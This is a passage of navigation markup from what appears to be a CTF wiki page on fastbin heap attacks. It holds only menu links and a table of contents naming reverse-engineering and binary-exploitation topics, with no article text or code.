class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/vm/vm/ class=md-nav__link> 虛擬機分析 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7 type=checkbox id=nav-8-7> <label class=md-nav__link for=nav-8-7> Platform related <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Platform related" data-md-level=2> <label class=md-nav__title for=nav-8-7> <span class="md-nav__icon md-icon"></span> Platform related </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-1 type=checkbox id=nav-8-7-1> <label class=md-nav__link for=nav-8-7-1> Linux Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Linux Reverse" data-md-level=3> <label class=md-nav__title for=nav-8-7-1> <span class="md-nav__icon md-icon"></span> Linux Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/platform/linux/ld_preload/ class=md-nav__link> LD_PRELOAD </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/linux/false-disasm/ class=md-nav__link> False Disassembly </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/linux/detect-bp/ class=md-nav__link> Detecting Breakpoints </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/linux/detect-dbg/ class=md-nav__link> Detecting debugging </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-2 type=checkbox id=nav-8-7-2> <label class=md-nav__link for=nav-8-7-2> Windows Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Reverse" data-md-level=3> <label class=md-nav__title for=nav-8-7-2> <span class="md-nav__icon md-icon"></span> Windows Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-2-1 type=checkbox id=nav-8-7-2-1> <label class=md-nav__link for=nav-8-7-2-1> 脫殼技術 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=脫殼技術 data-md-level=4> <label class=md-nav__title for=nav-8-7-2-1> <span class="md-nav__icon md-icon"></span> 脫殼技術 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/packer-introduction/ class=md-nav__link> 保護殼簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/trace/ class=md-nav__link> 單步跟蹤法 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/esp/ class=md-nav__link> ESP 定律法 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/direct-oep/ class=md-nav__link> 一步到達 OEP 法 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/memory/ class=md-nav__link> 內存鏡像法 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/last-exception/ class=md-nav__link> 最後一次異常法 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/sfx/ class=md-nav__link> SFX 法 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/fix-iat/ class=md-nav__link> DUMP 及 IAT 重建 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/manually-fix-iat/ class=md-nav__link> 手動查找 IAT 並使用 ImportREC 重建 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/unpack-dll/ class=md-nav__link> DLL 文件脫殼 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-2-2 type=checkbox id=nav-8-7-2-2> <label class=md-nav__link for=nav-8-7-2-2> 反調試技術 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=反調試技術 data-md-level=4> <label class=md-nav__title for=nav-8-7-2-2> <span class="md-nav__icon md-icon"></span> 反調試技術 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/ntglobalflag/ class=md-nav__link> NtGlobalFlag </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/heap-flags/ class=md-nav__link> Heap Flags </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/the-heap/ class=md-nav__link> The Heap </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/int-3/ class=md-nav__link> Interrupt 3 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/isdebuggerpresent/ class=md-nav__link> IsDebuggerPresent </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/checkremotedebuggerpresent/ class=md-nav__link> CheckRemoteDebuggerPresent </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/ntqueryinformationprocess/ class=md-nav__link> NtQueryInformationProcess </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/zwsetinformationthread/ class=md-nav__link> ZwSetInformationThread </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/junk-code/ class=md-nav__link> 花指令 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/example/ class=md-nav__link> 反調試技術例題 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8 type=checkbox id=nav-8-8> <label class=md-nav__link for=nav-8-8> Language related <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Language related" data-md-level=2> <label class=md-nav__title for=nav-8-8> <span class="md-nav__icon md-icon"></span> Language related </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/language/introduction/ class=md-nav__link> 簡介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8-2 type=checkbox id=nav-8-8-2> <label class=md-nav__link for=nav-8-8-2> Python <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Python data-md-level=3> <label class=md-nav__title for=nav-8-8-2> <span class="md-nav__icon md-icon"></span> Python </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/language/python/introduction/ class=md-nav__link> Python 逆向入門 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8-3 type=checkbox id=nav-8-8-3> <label class=md-nav__link for=nav-8-8-3> Rust <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Rust data-md-level=3> <label class=md-nav__title for=nav-8-8-3> <span class="md-nav__icon md-icon"></span> Rust </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/language/rust/introduction/ class=md-nav__link> Rust 逆向入門 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8-4 type=checkbox id=nav-8-8-4> <label class=md-nav__link for=nav-8-8-4> Golang <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Golang data-md-level=3> <label class=md-nav__title for=nav-8-8-4> <span class="md-nav__icon md-icon"></span> Golang </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/language/go/introduction/ class=md-nav__link> Golang 逆向入門 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9 type=checkbox id=nav-9 checked> <label class=md-nav__link for=nav-9> Pwn <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Pwn data-md-level=1> <label class=md-nav__title for=nav-9> <span class="md-nav__icon md-icon"></span> Pwn </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1 type=checkbox id=nav-9-1 checked> <label class=md-nav__link for=nav-9-1> Linux Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Linux Platform" data-md-level=2> <label class=md-nav__title for=nav-9-1> <span class="md-nav__icon md-icon"></span> Linux Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1 type=checkbox id=nav-9-1-1 checked> <label class=md-nav__link for=nav-9-1-1> User Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="User Mode" data-md-level=3> <label class=md-nav__title for=nav-9-1-1> <span class="md-nav__icon md-icon"></span> User Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-1 type=checkbox id=nav-9-1-1-1> <label class=md-nav__link for=nav-9-1-1-1> Environment <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Environment data-md-level=4> <label class=md-nav__title for=nav-9-1-1-1> <span class="md-nav__icon md-icon"></span> Environment </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../environment/ class=md-nav__link> Environment </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2 type=checkbox id=nav-9-1-1-2 checked> <label class=md-nav__link for=nav-9-1-1-2> Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Exploitation data-md-level=4> <label class=md-nav__title for=nav-9-1-1-2> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1 type=checkbox id=nav-9-1-1-2-1> <label class=md-nav__link for=nav-9-1-1-2-1> Stack Overflow <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Stack Overflow" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-1> <span class="md-nav__icon md-icon"></span> Stack Overflow </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-1 type=checkbox id=nav-9-1-1-2-1-1> <label class=md-nav__link for=nav-9-1-1-2-1-1> x86 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=x86 data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-1> <span class="md-nav__icon md-icon"></span> x86 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../stackoverflow/x86/stack-intro/ class=md-nav__link> 棧介紹 </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/x86/stackoverflow-basic/ class=md-nav__link> 棧溢出原理 </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/x86/basic-rop/ class=md-nav__link> 基本 ROP </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/x86/medium-rop/ class=md-nav__link> 中級ROP </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-1-5 type=checkbox id=nav-9-1-1-2-1-1-5> <label class=md-nav__link for=nav-9-1-1-2-1-1-5> 高級 ROP <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="高級 ROP" data-md-level=7> <label class=md-nav__title for=nav-9-1-1-2-1-1-5> <span class="md-nav__icon md-icon"></span> 高級 ROP </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../stackoverflow/x86/advanced-rop/advanced-rop/ class=md-nav__link> 高級 ROP </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/x86/advanced-rop/ret2dlresolve/ class=md-nav__link> ret2dlresolve </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/x86/advanced-rop/ret2vdso/ class=md-nav__link> ret2VDSO </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/x86/advanced-rop/srop/ class=md-nav__link> SROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-1-6 type=checkbox id=nav-9-1-1-2-1-1-6> <label class=md-nav__link for=nav-9-1-1-2-1-1-6> 花式棧溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=花式棧溢出 data-md-level=7> <label class=md-nav__title for=nav-9-1-1-2-1-1-6> <span class="md-nav__icon md-icon"></span> 花式棧溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../stackoverflow/x86/fancy-rop/ class=md-nav__link> 花式棧溢出技巧 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-2 type=checkbox id=nav-9-1-1-2-1-2> <label class=md-nav__link for=nav-9-1-1-2-1-2> arm <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=arm data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-2> <span class="md-nav__icon md-icon"></span> arm </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../stackoverflow/arm/environment/ class=md-nav__link> 環境搭建 </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/arm/rop/ class=md-nav__link> Arm ROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-3 type=checkbox id=nav-9-1-1-2-1-3> <label class=md-nav__link for=nav-9-1-1-2-1-3> mips <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=mips data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-3> <span class="md-nav__icon md-icon"></span> mips </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../stackoverflow/mips/rop/ class=md-nav__link> mips - ROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-4 type=checkbox id=nav-9-1-1-2-1-4> <label class=md-nav__link for=nav-9-1-1-2-1-4> risc-v <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=risc-v data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-4> <span class="md-nav__icon md-icon"></span> risc-v </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../stackoverflow/risc-v/readme/ class=md-nav__link> RISC-V </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-2 type=checkbox id=nav-9-1-1-2-2> <label class=md-nav__link for=nav-9-1-1-2-2> Format String <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Format String" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-2> <span class="md-nav__icon md-icon"></span> Format String </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../fmtstr/fmtstr-intro/ class=md-nav__link> 原理介紹 </a> </li> <li class=md-nav__item> <a href=../../../fmtstr/fmtstr-exploit/ class=md-nav__link> 利用 </a> </li> <li class=md-nav__item> <a href=../../../fmtstr/fmtstr-example/ class=md-nav__link> 例子 </a> </li> <li class=md-nav__item> <a href=../../../fmtstr/fmtstr-detect/ class=md-nav__link> 檢測 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3 type=checkbox id=nav-9-1-1-2-3 checked> <label class=md-nav__link for=nav-9-1-1-2-3> Heap Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Heap Exploitation" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-3> <span class="md-nav__icon md-icon"></span> Heap Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3-1 type=checkbox id=nav-9-1-1-2-3-1 checked> <label class=md-nav__link for=nav-9-1-1-2-3-1> Ptmalloc2 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Ptmalloc2 data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-3-1> <span class="md-nav__icon md-icon"></span> Ptmalloc2 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../introduction/ class=md-nav__link> 堆利用 </a> </li> <li class=md-nav__item> <a href=../heap-overview/ class=md-nav__link> 堆概述 </a> </li> <li class=md-nav__item> <a href=../heap-structure/ class=md-nav__link> 堆相關數據結構 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3-1-4 type=checkbox id=nav-9-1-1-2-3-1-4> <label class=md-nav__link for=nav-9-1-1-2-3-1-4> 深入理解 Ptmalloc2 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="深入理解 Ptmalloc2" data-md-level=7> <label class=md-nav__title for=nav-9-1-1-2-3-1-4> <span class="md-nav__icon md-icon"></span> 深入理解 Ptmalloc2 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../implementation/overview/ class=md-nav__link> 深入理解堆的實現 </a> </li> <li class=md-nav__item> <a href=../implementation/basic/ class=md-nav__link> 基礎操作 </a> </li> <li class=md-nav__item> <a href=../implementation/heap-init/ class=md-nav__link> 堆初始化 </a> </li> <li class=md-nav__item> <a href=../implementation/malloc/ class=md-nav__link> 申請內存塊 </a> </li> <li class=md-nav__item> <a href=../implementation/free/ class=md-nav__link> 釋放內存塊 </a> </li> <li class=md-nav__item> <a href=../implementation/tcache/ class=md-nav__link> tcache </a> </li> <li class=md-nav__item> <a href=../implementation/malloc-state/ class=md-nav__link> malloc_state 相關函數 </a> </li> <li class=md-nav__item> <a href=../implementation/misc/ class=md-nav__link> 測試支持 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../heapoverflow-basic/ class=md-nav__link> 堆溢出 </a> </li> <li class=md-nav__item> <a href=../off-by-one/ class=md-nav__link> 堆中的 Off-By-One </a> </li> <li class=md-nav__item> <a href=../chunk-extend-overlapping/ class=md-nav__link> Chunk Extend and Overlapping </a> </li> <li class=md-nav__item> <a href=../unlink/ class=md-nav__link> Unlink </a> </li> <li class=md-nav__item> <a href=../use-after-free/ class=md-nav__link> Use After Free </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> Fastbin Attack <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> Fastbin Attack </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 介紹 </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 原理 </a> </li> <li class=md-nav__item> <a href=#fastbin-double-free class=md-nav__link> Fastbin Double Free </a> <nav class=md-nav aria-label="Fastbin Double Free"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 介紹 </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 小總結 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#house-of-spirit class=md-nav__link> House Of Spirit </a> <nav class=md-nav aria-label="House Of Spirit"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 介紹 </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 小總結 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#alloc-to-stack class=md-nav__link> Alloc to Stack </a> <nav class=md-nav aria-label="Alloc to Stack"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_9 class=md-nav__link> 介紹 </a> </li> <li class=md-nav__item> <a href=#_10 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> 小總結 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#arbitrary-alloc class=md-nav__link> Arbitrary Alloc </a> <nav class=md-nav aria-label="Arbitrary Alloc"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_12 class=md-nav__link> 介紹 </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_14 class=md-nav__link> 小總結 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2014-hacklu-oreo class=md-nav__link> 2014 hack.lu oreo </a> <nav class=md-nav aria-label="2014 hack.lu oreo"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_15 class=md-nav__link> 基本分析 </a> </li> <li class=md-nav__item> <a href=#_16 class=md-nav__link> 基本功能 </a> </li> <li class=md-nav__item> <a href=#_17 class=md-nav__link> 利用 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2015-9447-ctf-search-engine class=md-nav__link> 2015 9447 CTF : Search Engine </a> <nav class=md-nav aria-label="2015 9447 CTF : Search Engine"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_18 class=md-nav__link> 基本信息 </a> </li> <li class=md-nav__item> <a href=#_19 class=md-nav__link> 基本功能 </a> </li> <li class=md-nav__item> <a href=#_20 class=md-nav__link> 詞語結構體 </a> </li> <li class=md-nav__item> <a href=#_21 class=md-nav__link> 堆內存相關操作 </a> </li> <li class=md-nav__item> <a href=#_22 class=md-nav__link> 漏洞 </a> </li> <li class=md-nav__item> <a href=#_23 class=md-nav__link> 利用 </a> <nav class=md-nav aria-label=利用> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_24 class=md-nav__link> 利用思路 </a> </li> <li class=md-nav__item> <a href=#libc class=md-nav__link> 泄漏 libc 地址 </a> </li> <li class=md-nav__item> <a href=#fastbin class=md-nav__link> 構造 fastbin 循環鏈表 </a> </li> <li class=md-nav__item> <a href=#malloc_hook-chunk class=md-nav__link> 分配 malloc_hook 附近chunk </a> </li> <li class=md-nav__item> <a href=#shell class=md-nav__link> shell </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2017-0ctf-babyheap class=md-nav__link> 2017 0ctf babyheap </a> <nav class=md-nav aria-label="2017 0ctf babyheap"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_25 class=md-nav__link> 基本信息 </a> </li> <li class=md-nav__item> <a href=#_26 class=md-nav__link> 基本功能 </a> </li> <li class=md-nav__item> <a href=#_27 class=md-nav__link> 利用思路 </a> <nav class=md-nav aria-label=利用思路> <ul class=md-nav__list> <li class=md-nav__item> <a href=#libc_1 class=md-nav__link> 泄漏 libc 基地址 </a> </li> <li class=md-nav__item> <a href=#chunkmalloc_hook class=md-nav__link> 分配chunk到malloc_hook附近 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_28 class=md-nav__link> 題目 </a> </li> <li class=md-nav__item> <a href=#_29 class=md-nav__link> 參考文獻 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../unsorted-bin-attack/ class=md-nav__link> Unsorted Bin Attack </a> </li> <li class=md-nav__item> <a href=../large-bin-attack/ class=md-nav__link> Large Bin Attack </a> </li> <li class=md-nav__item> <a href=../tcache-attack/ class=md-nav__link> Tcache attack </a> </li> <li class=md-nav__item> <a href=../house-of-einherjar/ class=md-nav__link> House Of Einherjar </a> </li> <li class=md-nav__item> <a href=../house-of-force/ class=md-nav__link> House Of Force </a> </li> <li class=md-nav__item> <a href=../house-of-lore/ class=md-nav__link> House of Lore </a> </li> <li class=md-nav__item> <a href=../house-of-orange/ class=md-nav__link> House of Orange </a> </li> <li class=md-nav__item> <a href=../house-of-rabbit/ class=md-nav__link> House of Rabbit </a> </li> <li class=md-nav__item> <a href=../house-of-roman/ class=md-nav__link> House of Roman </a> </li> <li class=md-nav__item> <a href=../house-of-pig/ class=md-nav__link> House of Pig </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3-2 type=checkbox id=nav-9-1-1-2-3-2> <label class=md-nav__link for=nav-9-1-1-2-3-2> Musl-mallocng <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Musl-mallocng data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-3-2> <span class="md-nav__icon md-icon"></span> Musl-mallocng </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../mallocng/readme/ class=md-nav__link> Readme </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-4 type=checkbox id=nav-9-1-1-2-4> <label class=md-nav__link for=nav-9-1-1-2-4> IO_FILE Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="IO_FILE Exploitation" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-4> <span class="md-nav__icon md-icon"></span> IO_FILE Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../io-file/introduction/ class=md-nav__link> FILE結構 </a> </li> <li class=md-nav__item> <a href=../../../io-file/fake-vtable-exploit/ class=md-nav__link> 僞造vtable劫持程序流程 </a> </li> <li class=md-nav__item> <a href=../../../io-file/fsop/ class=md-nav__link> FSOP </a> </li> <li class=md-nav__item> <a href=../../../io-file/exploit-in-libc2.24/ class=md-nav__link> glibc 2.24下 IO_FILE 的利用 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-5 type=checkbox id=nav-9-1-1-2-5> <label class=md-nav__link for=nav-9-1-1-2-5> Integer Overflow <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Integer Overflow" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-5> <span class="md-nav__icon md-icon"></span> Integer Overflow </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../integeroverflow/introduction/ class=md-nav__link> 整數溢出 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-6 type=checkbox id=nav-9-1-1-2-6> <label class=md-nav__link for=nav-9-1-1-2-6> Type Confusion <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Type Confusion" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-6> <span class="md-nav__icon md-icon"></span> Type Confusion </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../type-confusion/readme/ class=md-nav__link> Type Confusion </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-7 type=checkbox id=nav-9-1-1-2-7> <label class=md-nav__link for=nav-9-1-1-2-7> Uninitialized Memory <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Uninitialized Memory" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-7> <span class="md-nav__icon md-icon"></span> Uninitialized Memory </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../uninitialized-memory/readme/ class=md-nav__link> Uninitialized Memory </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-8 type=checkbox id=nav-9-1-1-2-8> <label class=md-nav__link for=nav-9-1-1-2-8> Race Condition <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Race Condition" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-8> <span class="md-nav__icon md-icon"></span> Race Condition </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../race-condition/introduction/ class=md-nav__link> Race Condition </a> </li> <li class=md-nav__item> <a href=../../../race-condition/problem/ class=md-nav__link> 題目 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-3 type=checkbox id=nav-9-1-1-3> <label class=md-nav__link for=nav-9-1-1-3> Defense <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Defense data-md-level=4> <label class=md-nav__title for=nav-9-1-1-3> <span class="md-nav__icon md-icon"></span> Defense </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../mitigation/canary/ class=md-nav__link> Canary </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle 